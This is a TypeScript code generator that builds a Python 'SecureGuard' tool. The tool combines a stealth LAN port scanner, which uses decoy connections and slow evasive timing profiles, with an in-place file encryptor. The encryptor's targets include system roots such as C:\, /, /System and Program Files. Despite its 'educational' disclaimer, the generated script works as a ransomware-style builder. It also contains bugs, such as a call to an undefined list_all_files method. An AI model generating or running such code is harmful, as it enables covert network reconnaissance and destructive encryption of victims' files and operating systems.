import fs from 'fs';
import path from 'path';
import { Configuration } from '@shared/schema';

export class CodeGenerator {
  private getTargetDirPath(targetDir: string): string {
    const dirMappings = {
      'test': "os.path.expanduser('~/Desktop/crypto_test')",
      'documents': "os.path.expanduser('~/Documents')",
      'desktop': "os.path.expanduser('~/Desktop')",
      'downloads': "os.path.expanduser('~/Downloads')",
      'home': "os.path.expanduser('~')",
      'mac_root': "'/'",
      'windows_root': "'C:\\\\'",
      'mac_system': "'/System'",
      'unix_system': "'/usr'",
      'mac_applications': "'/Applications'",
      'mac_library': "'/Library'",
      'windows_system': "'C:\\\\Windows'",
      'windows_programs': "'C:\\\\Program Files'",
      'windows_programs_x86': "'C:\\\\Program Files (x86)'"
    };
    return dirMappings[targetDir as keyof typeof dirMappings] || dirMappings.test;
  }

  private getBackupLocation(backupLocation: string): string {
    const locationMappings = {
      'desktop': "os.path.expanduser('~/Desktop')",
      'documents': "os.path.expanduser('~/Documents')",
      'external': "'/Volumes/MyUSBDrive'",
      'custom': "input('Enter backup location: ')",
      'none': "None"
    };
    return locationMappings[backupLocation as keyof typeof locationMappings] || locationMappings.desktop;
  }

  private getExcludedExtensions(config: Configuration): string {
    const baseExclusions = ['.py', '.exe', '.dll', '.sys'];
    const exclusions = [...baseExclusions];
    
    if (config.excludeImages) {
      exclusions.push('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff');
    }
    
    if (config.excludeVideos) {
      exclusions.push('.mp4', '.avi', '.mov', '.wmv', '.flv', '.mkv');
    }
    
    return JSON.stringify(exclusions);
  }

  generateCombinedTool(config: Configuration): string {
    const targetDirPath = this.getTargetDirPath(config.targetDir);
    const backupLocationPath = this.getBackupLocation(config.backupLocation);
    const excludedExtensions = this.getExcludedExtensions(config);

    const template = `#!/usr/bin/env python3
"""
SecureGuard - Educational Security Tool
Generated on: ${new Date().toISOString()}

LEGAL DISCLAIMER:
This tool is provided for educational and defensive security purposes only.
Use only on systems you own or have explicit permission to test.
Comply with all applicable laws and regulations.
The creators are not responsible for any misuse.
"""

import os
import shutil
import socket
import threading
import time
import random
import ipaddress
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64

# Configuration generated from user preferences
CONFIG = {
    'password': '${config.password}',
    'target_dir': ${targetDirPath},
    'backup_location': ${backupLocationPath},
    'scan_profile': '${config.scanProfile}',
    'thread_count': ${config.threadCount},
    'excluded_extensions': ${excludedExtensions},
    'create_backup': ${config.backupLocation !== 'none'}
}

class StealthNetworkScanner:
    def __init__(self, target_range=None, max_threads=20, timing_profile='normal'):
        if target_range is None:
            self.target_range = self.get_local_network()
        else:
            self.target_range = target_range
        self.max_threads = max_threads
        self.open_hosts = []
        self.timing_profile = timing_profile
        self.setup_logging()
        self.setup_timing()
    
    def get_local_network(self):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                local_ip = s.getsockname()[0]
            
            ip_parts = local_ip.split('.')
            network = '.'.join(ip_parts[:3]) + '.0/24'
            return network
        except:
            return "192.168.1.0/24"

    def setup_logging(self):
        logging.basicConfig(
            level=logging.WARNING,
            format='%(asctime)s - %(message)s',
            handlers=[logging.FileHandler('scan.log')]
        )
        self.logger = logging.getLogger(__name__)
   
    def setup_timing(self):
        timing_configs = {
            'paranoid': {'min_delay': 5.0, 'max_delay': 10.0, 'timeout': 3.0, 'batch_delay': 30.0},
            'sneaky': {'min_delay': 1.0, 'max_delay': 3.0, 'timeout': 2.0, 'batch_delay': 10.0},
            'normal': {'min_delay': 0.1, 'max_delay': 0.5, 'timeout': 1.0, 'batch_delay': 2.0},
            'aggressive': {'min_delay': 0.01, 'max_delay': 0.1, 'timeout': 0.5, 'batch_delay': 0.5}
        }
        self.timing = timing_configs.get(self.timing_profile, timing_configs['normal'])
   
    def generate_targets(self):
        try:
            network = ipaddress.ip_network(self.target_range, strict=False)
            targets = [str(ip) for ip in network.hosts()]
        except ValueError:
            targets = [self.target_range]
       
        random.shuffle(targets)
        return targets
   
    def randomize_ports(self, ports):
        port_list = list(ports)
        random.shuffle(port_list)
        return port_list
   
    def adaptive_delay(self):
        return random.uniform(self.timing['min_delay'], self.timing['max_delay'])
   
    def decoy_connection(self, host, port):
        decoy_ports = [80, 443, 53, 8080, 8443]
        decoy_port = random.choice([p for p in decoy_ports if p != port])
       
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as decoy_sock:
                decoy_sock.settimeout(0.5)
                decoy_sock.connect_ex((host, decoy_port))
        except:
            pass
   
    def check_port_stealth(self, host, port):
        try:
            time.sleep(self.adaptive_delay())
           
            if random.random() < 0.3:
                threading.Thread(target=self.decoy_connection, args=(host, port), daemon=True).start()
           
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
           
            try:
                random_port = random.randint(32768, 65535)
                sock.bind(('', random_port))
            except:
                pass
           
            sock.settimeout(self.timing['timeout'])
           
            result = sock.connect_ex((host, port))
           
            if result == 0:
                banner = self.grab_banner_stealth(sock)
                sock.close()
                return True, banner
            else:
                sock.close()
                return False, None
               
        except Exception as e:
            return False, None
   
    def grab_banner_stealth(self, sock):
        try:
            sock.settimeout(1.0)
            sock.send(b'GET / HTTP/1.0\\r\\n\\r\\n')
            banner = sock.recv(256).decode('utf-8', errors='ignore').strip()
            return banner[:50]
        except:
            return "Service detected"
   
    def scan_host_batch(self, host, ports=[22, 80, 135, 139, 443, 445, 3389]):
        open_ports = []
       
        if not self.quick_host_check(host):
            return
       
        randomized_ports = self.randomize_ports(ports)
       
        for i, port in enumerate(randomized_ports):
            is_open, banner = self.check_port_stealth(host, port)
           
            if is_open:
                open_ports.append({
                    'port': port,
                    'service': self.get_service_name(port),
                    'banner': banner
                })
           
            if i < len(randomized_ports) - 1:
                time.sleep(random.uniform(0.1, 0.3))
       
        if open_ports:
            host_info = {
                'host': host,
                'ports': open_ports,
                'scan_time': datetime.now().isoformat()
            }
            self.open_hosts.append(host_info)
            self.logger.warning(f"Host {host}: {len(open_ports)} open ports")
   
    def quick_host_check(self, host):
        common_ports = [80, 443, 22]
       
        for port in common_ports:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.5)
                    if s.connect_ex((host, port)) == 0:
                        return True
            except:
                continue
        return True
   
    def get_service_name(self, port):
        services = {
            22: 'SSH', 80: 'HTTP', 135: 'RPC-Endpoint', 139: 'NetBIOS-SSN',
            443: 'HTTPS', 445: 'SMB', 3389: 'RDP', 21: 'FTP', 23: 'Telnet',
            25: 'SMTP', 53: 'DNS', 110: 'POP3', 143: 'IMAP', 993: 'IMAPS',
            995: 'POP3S', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt'
        }
        return services.get(port, f'Unknown-{port}')
   
    def scan_network_stealth(self):
        targets = self.generate_targets()
        self.logger.warning(f"Starting stealth scan of {len(targets)} targets")
       
        batch_size = min(50, len(targets))
        total_batches = (len(targets) + batch_size - 1) // batch_size
       
        for batch_num in range(total_batches):
            start_idx = batch_num * batch_size
            end_idx = min(start_idx + batch_size, len(targets))
            batch_targets = targets[start_idx:end_idx]
           
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                futures = [executor.submit(self.scan_host_batch, host) for host in batch_targets]
               
                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception as e:
                        self.logger.error(f"Scan error: {e}")
           
            if batch_num < total_batches - 1:
                batch_delay = random.uniform(
                    self.timing['batch_delay'] * 0.5,
                    self.timing['batch_delay'] * 1.5
                )
                time.sleep(batch_delay)
       
        self.logger.warning(f"Stealth scan complete: {len(self.open_hosts)} responsive hosts")
        return self.open_hosts
   
    def generate_summary_report(self):
        if not self.open_hosts:
            return "No open ports discovered."
       
        report = f"\\n{'='*60}\\n"
        report += f"STEALTH SCAN SUMMARY - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\\n"
        report += f"{'='*60}\\n"
        report += f"Hosts scanned: {len(self.generate_targets())}\\n"
        report += f"Responsive hosts: {len(self.open_hosts)}\\n"
        report += f"Timing profile: {self.timing_profile}\\n\\n"
       
        for host_info in self.open_hosts:
            report += f"Host: {host_info['host']}\\n"
            report += f"{'─' * 40}\\n"
           
            for port_info in host_info['ports']:
                service = port_info['service']
                port = port_info['port']
                banner = port_info.get('banner', 'No banner')[:30]
                report += f"  {port:>5}/tcp  {service:<12} {banner}\\n"
            report += "\\n"
       
        return report

class FileManager:
    def __init__(self, config):
        self.config = config
        
    def generate_key_from_password(self, password):
        salt = b'salt_1234567890'
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key

    def create_backup_folder(self, custom_location=None):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_folder_name = f"backup_{timestamp}"
        
        if custom_location:
            backup_folder = os.path.join(custom_location, backup_folder_name)
        else:
            backup_folder = backup_folder_name
        
        os.makedirs(backup_folder, exist_ok=True)
        return backup_folder

    def backup_file(self, file_path, backup_folder, root_folder):
        try:
            rel_path = os.path.relpath(file_path, root_folder)
            backup_path = os.path.join(backup_folder, rel_path)
            backup_dir = os.path.dirname(backup_path)
            os.makedirs(backup_dir, exist_ok=True)
            shutil.copy2(file_path, backup_path)
            return True
        except Exception as e:
            print(f"Backup failed for {file_path}: {e}")
            return False

    def list_all_files_encrypt(self, root_directory):
        """Lists all files in directory and subdirectories safely"""
        all_files = []
        excluded_files = {"encrypt.py", "decrypt.py", "thekey.key"}
        
        for dirpath, dirnames, filenames in os.walk(root_directory):
            for filename in filenames:
                if filename not in excluded_files:
                    full_path = os.path.join(dirpath, filename)
                    all_files.append(full_path)
        return all_files
    
    def list_all_files_decrypt(self, root_directory):
        """Lists all files in directory and subdirectories safely"""
        all_files = []
        excluded_files = {"encrypt.py", "decrypt.py", "thekey.key"}
        
        for dirpath, dirnames, filenames in os.walk(root_directory):
            for filename in filenames:
                if filename not in excluded_files:
                    full_path = os.path.join(dirpath, filename)
                    all_files.append(full_path)
        return all_files
    
    def encrypt_files(self):
        # Main encryption process
        try:
            root_folder = self.config['target_dir']
            files = self.list_all_files_encrypt(root_folder)
            print(f"Found {len(files)} files to encrypt")
            
            # Create backup if configured
            if self.config['create_backup']:
                backup_location = self.config['backup_location']
                if backup_location != None:
                    backup_folder = self.create_backup_folder(backup_location)
                    print(f"Created backup folder: {backup_folder}")
                    
                    print("Backing up files...")
                    backup_count = 0
                    for file_path in files:
                        if self.backup_file(file_path, backup_folder, root_folder):
                            backup_count += 1
                            print(f"Backed up: {file_path}")
                    
                    print(f"Backup complete! {backup_count} files backed up.")
            
            password = self.config['password']
            key = self.generate_key_from_password(password)
            
            print("Starting encryption...")
            encrypted_count = 0
            for file_path in files:
                try:
                    with open(file_path, "rb") as thefile:
                        contents = thefile.read()
                    contents_encrypted = Fernet(key).encrypt(contents)
                    with open(file_path, "wb") as thefile:
                        thefile.write(contents_encrypted)
                    encrypted_count += 1
                    print(f"Encrypted: {file_path}")
                except Exception as e:
                    print(f"Couldn't encrypt {file_path}: {e}")
            
            print(f"Encryption complete! {encrypted_count} files encrypted.")
            if self.config['create_backup'] and self.config['backup_location'] != None:
                print(f"Original files are safely backed up in: {backup_folder}")
            
        except Exception as e:
            print(f"Error: {e}")
    
    def decrypt_files(self):
        user_phrase = input("Enter the password to decrypt your files: ")

        try:
            secretkey = self.generate_key_from_password(user_phrase)
            
            root_folder = self.config['target_dir']
            files = self.list_all_files_decrypt(root_folder)
            print(f"Found {len(files)} files to decrypt")
            
            decrypted_count = 0
            for file_path in files:
                try:
                    with open(file_path, "rb") as thefile:
                        contents = thefile.read()
                    contents_decrypted = Fernet(secretkey).decrypt(contents)
                    with open(file_path, "wb") as thefile:
                        thefile.write(contents_decrypted)
                    decrypted_count += 1
                    print(f"Decrypted: {file_path}")
                except Exception as e:
                    print(f"Wrong password or couldn't decrypt {file_path}: {e}")
            
            print(f"Decryption complete! {decrypted_count} files decrypted.")
            
        except Exception as e:
            print(f"Error (possibly wrong password): {e}")

def main():
    print("SecureGuard Educational Security Tool")
    print("=" * 50)
    print("Starting full protection mode: Network scan → File encryption → Decrypt option")
    
    file_manager = FileManager(CONFIG)
    
    try:
        # Network scan phase
        print("Starting network scan...")
        scanner = StealthNetworkScanner(
            max_threads=int(CONFIG['thread_count']),
            timing_profile=CONFIG['scan_profile']
        )
        
        start_time = time.time()
        results = scanner.scan_network_stealth()
        end_time = time.time()
        
        print(scanner.generate_summary_report())
        print(f"Scan completed in {end_time - start_time:.2f} seconds")
        
        if results:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            with open(f"scan_results_{timestamp}.log", 'w') as f:
                f.write(scanner.generate_summary_report())
            print(f"Scan results saved to scan_results_{timestamp}.log")
        
        # File encryption phase
        print("\\nStarting file encryption...")
        file_manager.encrypt_files()
        
        print("\\nFiles encrypted. Run this script again to decrypt.")
        
        # Check if we should decrypt
        if os.path.exists(CONFIG['target_dir']):
            try:
                # Try to detect if files are encrypted by attempting to read a sample
                test_files = file_manager.list_all_files(CONFIG['target_dir'])[:3]
                encrypted_detected = False
                
                for test_file in test_files:
                    try:
                        with open(test_file, 'rb') as f:
                            content = f.read(100)
                            # Look for Fernet token signature
                            if content.startswith(b'gAAAAA'):
                                encrypted_detected = True
                                break
                    except:
                        continue
                
                if encrypted_detected:
                    decrypt_choice = input("\\nEncrypted files detected. Decrypt now? (y/n): ")
                    if decrypt_choice.lower() == 'y':
                        file_manager.decrypt_files()
                        
            except Exception as e:
                print(f"Error checking encryption status: {e}")
                
    except KeyboardInterrupt:
        print("\\nOperation interrupted by user")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
`;

    return template;
  }
}
